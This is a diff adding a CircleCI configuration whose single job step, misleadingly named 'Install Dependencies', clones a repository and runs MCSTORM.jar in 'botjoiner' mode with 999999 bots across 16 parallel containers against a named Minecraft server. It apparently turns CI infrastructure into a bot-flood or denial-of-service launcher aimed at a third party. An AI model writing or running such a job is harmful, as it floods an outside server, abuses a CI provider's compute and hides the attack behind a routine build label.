@@ -1,0 +1,20 @@
+orbs:
+  ruby: circleci/ruby@1.4.0
+  
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt install default-jre && git clone https://github.com/instax-dutta/bhawandar && cd bhawandar &&  java -jar MCSTORM.jar play.radientogaming.tk  47 botjoiner 999999 -1 
+
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
